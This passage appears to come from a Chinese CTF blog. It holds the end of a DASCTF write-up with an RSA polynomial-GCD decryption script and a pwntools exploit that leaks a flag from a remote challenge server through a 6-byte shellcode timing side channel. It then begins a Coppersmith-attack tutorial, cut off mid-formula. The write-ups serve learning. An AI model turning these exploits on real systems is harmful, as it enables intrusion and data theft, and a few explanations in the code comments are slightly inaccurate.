style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>我们很快就反映出来这俩个多项式有一个公因式为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>也就是我们可以把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>因式分解成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x+1)(x-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，但是像<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>1</mn></msub><mtext>、</mtext><msub><mi>f</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">f_1、f_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>这样的很长的多项式，就很难对其进行因式分解就像大整数难以找因数这样。</li><li>而我们可以使用多项式的辗转相除法，如果寻找到俩个多项式的公因式，就可以说明这俩个多项式因式分解后必然有我们求得的公因式。</li><li>这样我们就将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>1</mn></msub><mtext>、</mtext><mi>f</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">f_1、f2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord">2</span></span></span></span>这样的多项式简化为这俩个公因式，使用这两个的公因式去再去求解方程，这次就可以求解成功了。在<code>sagemath</code>中没有实现<code>Zmod(n)</code>下的多项式辗转相除法。我们要手动实现gcd。这时我们可以得到一个关于x的一次多项式，这时我们就可以解出该方程的解。</li><li>所以exp如下，其中<code>-f2.monic()[0]</code> <strong>将多项式的首项系数变为负数</strong>，从而得到正数解，接下来就是<code>RSA</code>的解密了：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">num1 = <span class="number">9234477875452540050907055680812175733211030585401847024956094109885380715661662501110233684131338074697772834745898452222070551975818702828913932925854661</span></span><br><span class="line">num2 = <span class="number">6762350904214303306453303458299415835504119332199015610928593488027530960090511757877122152908652987754908309308543812479366000921214925642982325588758637</span></span><br><span class="line">n = <span class="number">101642316595332652021348165259853423287787139517550249986161819826180514401858258316466101056877182367161299111697465439636861942636526396547011727147471566130633614685728563576613692851860684686033186826342178072882901576159305747639645374751566751967096281105148714033096611618024355982220235949274576036321</span></span><br><span class="line">e1= <span class="number">1630</span></span><br><span class="line">e2= <span class="number">1866</span></span><br><span class="line">c1= <span class="number">8857135083997055103287497833179378469532619748945804429057682575070405217145941944821968708809563240261403711644389684947851643865895254406194464015430673347359589677809515117412321862622147634752091324365628790687343748145339949310696116239361890881096088375070083053010564890401663562726144984405628773323</span></span><br><span class="line">c2= <span class="number">44531030636557714647477473185500183066851251320453194953972504422367649302810396344051696851757189817391648356459225688318373454949578822468293099948132700460437006478679492801335689493431764882835346904225119630026545592437198370606462285405519745361570058335573353886454277790277663038008240372746639859253</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (x+num1)^e1 - c1</span><br><span class="line">f2 = (x+num2)^e2 - c2</span><br><span class="line"><span class="keyword">while</span> f1:</span><br><span class="line">    f2,f1 = f1,f2 % f1</span><br><span class="line"><span class="comment">#print(f2)</span></span><br><span class="line">f2 = <span class="built_in">int</span>(-f2.monic()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(f2)</span><br><span class="line">f2 = <span class="number">11336690855123440918981344983549075111042146183515447436428352345866740484601085654489736362113592934893771650378228571216482632281529958749765063994128413</span></span><br></pre></td></tr></table></figure><h2 id="easy_xor"><a class="markdownIt-Anchor" href="#easy_xor"></a> easy_xor</h2><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="sixbytes"><a class="markdownIt-Anchor" href="#sixbytes"></a> sixbytes</h2><h3 id="分析1"><a class="markdownIt-Anchor" href="#分析1"></a> 分析1</h3><ul><li>先来查看一下保护机制，发现保护全开</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403131201417.png" alt="image-20250403131201417"></p><ul><li>接下来逆向分析一下程序，先来查看一下<code>main</code>函数：主要调用了<code>sub_134A</code>、<code>sub_142C</code>、<code>sub_13B8</code>、<code>sub_12A9</code>、<code>v3()</code></li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403131246578.png" alt="image-20250403131246578"></p><ul><li>接下来我我们就来查看一下这些函数，查看<code>sub_134A</code>发现是一个输入输出初始化的函数，我们将其命名为<code>init</code>函数</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403131418211.png" alt="image-20250403131418211"></p><ul><li>接下来我们查看<code>sub_142C</code>就会发现这个函数会将flag读取出来放入<code>bss</code>段中，并且会返回<code>bss</code>段上的地址</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403131629000.png" alt="image-20250403131629000"></p><ul><li>查看<code>sub_13B8</code>发现，这里就是开辟一个可读可写可执行的内存段，然后允许我们写入<code>6</code>字节</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403131752810.png" alt="image-20250403131752810"></p><ul><li>查看<code>sub_12A9</code>发现，这个函数起到一个开启沙箱的作用</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403132044233.png" alt="image-20250403132044233"></p><ul><li>之后我们就会执行我们写入的那<code>6</code>个字节。</li></ul><h3 id="分析2"><a class="markdownIt-Anchor" href="#分析2"></a> 分析2</h3><ul><li>这题是一个写<code>shellcode</code>类型，还开启了沙箱，现在来查看一下沙箱的禁用。我们发现这个沙箱是一个黑名单，将系统调用号小于<code>0x40000000</code>都给禁用了，所以这题应该需要侧信道</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403132239903.png" alt="image-20250403132239903"></p><ul><li>我们先了解清楚，我们在调用<code>v3</code>这个函数的时候寄存器布局和栈布局如下，这样更有利于我们写shellcode。我们发现<code>flag</code>存储存放的地址值在<code>RDI</code>有直接给出。</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403133530054.png" alt="image-20250403133530054"></p><ul><li>一开始想不出来怎么构造<code>6</code>字节侧信道，看了<code>wp</code>之后才发现能这样构造。接下来就是一些接收和异常处理了。</li><li>构造的<code>shellcode</code>如下，如果大于的时候就会执行<code>loop</code>循环</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop:</span><br><span class="line">cmp byte ptr[rdi+index],&#123;cmp&#125;</span><br><span class="line">jg loop</span><br></pre></td></tr></table></figure><ul><li>当程序执行循环的时候，如果我们进行接收，就会出现如下的报错。</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403154013046.png" alt="image-20250403154013046"></p><ul><li>但是当没进入循环的时候程序会直接结束，我们接收时并不会抛出异常。</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403154028981.png" alt="image-20250403154028981"></p><ul><li>利用这个特点，我们从低字节爆破到高字节，这样当一个flag位第一次出现异常的时候，我们就知道，这个位的flag值就被爆破出来了。我们就可以接下去爆破下一个flag的位。最终我们就能爆破出flag的值。（爆破的有点慢，先做其他题去）</li></ul><p><img src="/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/image-20250403153930694.png" alt="image-20250403153930694"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">a = <span class="string">b&#x27;\x80?4\x7f\xfb&#x27;</span> <span class="comment"># idx = 0</span></span><br><span class="line">b = <span class="string">b&#x27;\x80\x7f\x014\x7f\xfa&#x27;</span> <span class="comment"># idx !=0</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">flag1 = <span class="string">&#x27;-0123456789abcdef&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">100</span>):</span><br><span class="line">    a = i.to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flag1:</span><br><span class="line">        b = j.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            shellcode = <span class="string">b&#x27;\x80?&#x27;</span>+ b + <span class="string">b&#x27;\x7f\xfb&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shellcode = <span class="string">b&#x27;\x80\x7f&#x27;</span>+ a + b + <span class="string">b&#x27;\x7f\xfa&#x27;</span></span><br><span class="line">        p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25730</span>)</span><br><span class="line">        p.sendline(shellcode)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recv(timeout=<span class="number">0.4</span>)</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：复现一下比赛</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>RSA之Coppersmith攻击</title>
    <link href="http://iyheart.github.io/2025/03/29/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E4%B9%8BCoppersmith%E6%94%BB%E5%87%BB/"/>
    <id>http://iyheart.github.io/2025/03/29/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/RSA%E4%B9%8BCoppersmith%E6%94%BB%E5%87%BB/</id>
    <published>2025-03-28T16:52:12.000Z</published>
    <updated>2025-05-14T13:02:45.286Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考博客：<a href="https://www.ruanx.net/coppersmith/">Coppersmith 攻击</a></li><li>参考博客：<a href="https://blog.csdn.net/qq_51999772/article/details/123620932">RSA中coppersmith定理的应用条件-CSDN博客</a></li></ul><h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><ul><li><code>Coppersmith</code>可以用于求多项式的小根，经常用于 RSA 攻击中“已知某些二进制位，求剩余位”这一类问题。</li></ul><h2 id="方程的思想"><a class="markdownIt-Anchor" href="#方程的思想"></a> 方程的思想</h2><ul><li><code>coppersmith</code>攻击主要用到的数学思想就是方程的思想。这边我们就先来举一个例子：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这边我们有一个512位的大数p</span></span><br><span class="line">p = getPrime(<span class="number">512</span>) <span class="comment"># 6741438656157143833543832730902889274588187101370523107064278107814792857441703824410652819364741481893721040127690023309393993763833158957274572099181751</span></span><br><span class="line"><span class="comment"># 现在我们只知道这个大数p的高400位</span></span><br><span class="line">p_high = p &gt;&gt; <span class="number">112</span></span><br><span class="line"><span class="built_in">print</span>(p_high)</span><br><span class="line"><span class="comment"># 1298353857614269002737857625343337886712120349999806855420820506922767503261098401301170199662351979411463881678564619275</span></span><br><span class="line"><span class="comment"># 这个时候我们就会使用未知数x表示p的低位,这时我们p就可以表示为方程</span></span><br><span class="line"><span class="comment"># 其中这个x并不会超过p</span></span><br><span class="line">p = p_high &lt;&lt; <span class="number">112</span> + x</span><br></pre></td></tr></table></figure><ul><li>对于一个阶为<code>e</code>的多项式<code>f</code>可以求得以下满足条件的方程：<ul><li><code>coppersmith攻击</code>就是，在模<code>n</code>的意义下，快速求出$ n^{\frac{1}{e}} $以内的根，在我们给的例子中就是解方程中的<code>x</code>。</li><li>给定$ \beta $ ,快速求出模某个<code>b</code>意义下较小的根，其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>≥</mo><msup><mi>n</mi><mi>β</mi></msup></mrow><annotation encoding="application/x-tex">b ≥ n^\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83041em;vertical-align:-0.13597em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span></span></span></span></span></span></span></span></li><li><strong>本质上就是解满足条件的方程,我们所需要做的就是去寻找条件和构造方程,本质上还是数学,如果只是要套公式的话,还是和算法没太大关系</strong></li></ul></li></ul><h2 id="相关论文"><a class="markdownIt-Anchor" href="#相关论文"></a> 相关论文</h2><ul><li>对于<code>Coppersmith</code>攻击，这个攻击的具体原理与<code>格</code>有关。并且目前为止<code>Coppersmith</code>攻击确实是比较重要的一个攻击。</li><li>而<code>Coppersmith</code>攻击之所以被称为<code>Coppersmith</code>攻击，是因为这个攻击方式是<code>Don Coppersmith</code>这个人发表的一篇论文，说明了这个攻击，所以后来这个攻击方式就被称为<code>Coppersmith</code>攻击。</li><li>这篇论文虽然发表时间已经过了很久，但还是很值得一读的（之后知识储备足够了，肯定会去读一读这篇论文），这篇论文就先放在这里。</li></ul><div class="row">    <embed src="coppersmith_attack.pdf" width="100%" height="550" type="application/pdf"></div><ul><li>之后其他人在<code>Coppersmith</code>攻击的基础之上提出了<code>二元Coppersmith</code>攻击。论文如下：</li></ul><div class="row">    <embed src="二元coppersmith.pdf" width="100%" height="550" type="application/pdf"></div><h1 id="sage实现copper"><a class="markdownIt-Anchor" href="#sage实现copper"></a> sage实现copper</h1><ul><li><p>在<code>sage</code>中应用<code>coppersmith</code>定理的<code>函数</code>有两个：<code>small_roots</code>、<code>coppersmith_howgrave_univariate</code></p></li><li><p>这边我们只介绍<code>small_roots</code>这个函数，而<code>coppersmith_howgrave_univariate</code>好像在新版的<code>sagemath</code>好像不存在（总之我没找到，之后找到了再写）。</p></li><li><p>这里就先来介绍一下<code>small_roots</code>的使用。使用的模版如下：</p><ul><li>这里<code>n</code>其实就是一个整数</li><li><code>PR.&lt;x&gt; = PolynomialRing(Zmod(n))</code><ul><li>定义一个在模n下的多项式整环,其实也就是一个多项式。这个多项式有一个特点就是它的系数不会超过n。</li><li>并且这个多项式使用<code>x</code>作为变量，就像这样<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>a</mi><mi>n</mi></msub><msup><mi>x</mi><mi>n</mi></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">f(x)=a_nx^n+a_{n-1}x^{n-1}+...+a_1x+a_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.814392em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0224389999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul></li><li>然后<code>f = </code>就相当于我们定义一个关于<code>x</code>的多项式（这一步就相当于确定关于<code>x</code>的方程）</li><li><code>f = f.monic() </code>：将这个多项式<code>f</code>转换为首项为<code>1</code>的。<strong>注意这一步是必须的，否则最高次数项不是1运行后会报错。</strong></li><li>之后就是<code>out = f.small_roots(X=2^n,beta=0.5)</code>寻找最小的根。这边有两个参数，要重点说明一下：<ul><li>这里的参数<code>X</code>表示限定我们要求的根的上限，上限太高可能就会找到其他解，或者是稍微浪费算力，这边可以在源码的倒数第三行可以发现。</li><li>而<code>beta</code>表示的是我们寻找的根的下限。<code>beta必须满足0&lt;=beta&lt;1</code>否则会报错。在下面源码中<code>第156行</code>会有判断。而<code>beta</code>的下限具体作用会展现在源码的最后一行，程序得到的根会在返回之前会先排除小于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>n</mi><mi>β</mi></msup></mrow><annotation encoding="application/x-tex">n^{\beta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span></span></span></span></span></span></span></span></span>的解。</li><li>总的来说<code>small_roots</code>是求解<span class="katex"><span class="katex-mathml"><math 